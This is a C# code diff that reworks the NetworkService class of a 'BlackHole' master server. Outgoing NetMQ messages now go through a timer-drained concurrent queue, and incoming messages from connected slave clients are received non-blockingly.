@@ -2,6 +2,7 @@
 using BlackHole.Common.Network.Protocol;
 using NetMQ;
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -14,7 +15,9 @@ namespace BlackHole.Master
     /// </summary>
     public sealed class NetworkService : Singleton<NetworkService>, IEventListener<SlaveEvent, Slave>
     {
+        public const int SEND_INTERVAL = 20;
         public const int PING_INTERVAL = 1000;
+
         public const int PING_COUNT_BEFORE_DISCONNECTION = 5;
         
         private NetMQContext m_netContext;
@@ -22,6 +25,7 @@ namespace BlackHole.Master
         private Poller m_poller;
         private Dictionary<int, Slave> m_slaveById;
         private bool m_started;
+        private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
 
         /// <summary>
         /// 
@@ -41,13 +45,19 @@ namespace BlackHole.Master
             m_server = m_netContext.CreateRouterSocket();
             m_server.Bind("tcp://*:5556");
             m_server.ReceiveReady += Server_ReceiveReady;
+            m_server.SendReady += Server_SendReady;
 
             var heartbeatTimer = new NetMQTimer(PING_INTERVAL);
             heartbeatTimer.Elapsed += Heartbeat;
-            
+
+            var sendTimer = new NetMQTimer(SEND_INTERVAL);
+            sendTimer.Elapsed += SendQueue;
+
             m_poller = new Poller();
+            m_poller.PollTimeout = 10;
             m_poller.AddSocket(m_server);
             m_poller.AddTimer(heartbeatTimer);
+            m_poller.AddTimer(sendTimer);
             m_poller.PollTillCancelledNonBlocking();
             m_started = true;
         }
@@ -72,9 +82,27 @@ namespace BlackHole.Master
         /// <param name="message"></param>
         public bool Send(NetMQMessage message)
         {
-            return m_server.TrySendMultipartMessage(message);
+            m_sendQueue.Enqueue(message);
+            return true;
         }
     
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void SendQueue(object sender, NetMQTimerEventArgs e)
+        {
+            NetMQMessage message = null;
+            var i = m_sendQueue.Count;
+            while (i > 0)
+            {
+                if (m_sendQueue.TryDequeue(out message))
+                    m_server.TrySendMultipartMessage(message);
+                i--;
+            }
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -116,18 +144,30 @@ namespace BlackHole.Master
         {
             Slave.PostEvent(new SlaveEvent(SlaveEventType.INCOMMING_MESSAGE, slave, message));
         }
-        
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void Server_SendReady(object sender, NetMQSocketEventArgs e)
+        {
+        }
+
         /// <summary>
         /// 
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
         private void Server_ReceiveReady(object sender, NetMQSocketEventArgs e)
-        { 
-            var frames = e.Socket.ReceiveMultipartMessage();
-            var identity = frames.First.Buffer;
+        {
+            NetMQMessage mqmessage = null;
+            if (!e.Socket.TryReceiveMultipartMessage(ref mqmessage))
+                return;
+
+            var identity = mqmessage.First.Buffer;
             var clientId = BitConverter.ToInt32(identity, 1);
-            var message = NetMessage.Deserialize(frames.Last.Buffer);
+            var message = NetMessage.Deserialize(mqmessage.Last.Buffer);
             
             Slave slave = null;
             if (!m_slaveById.ContainsKey(clientId))            
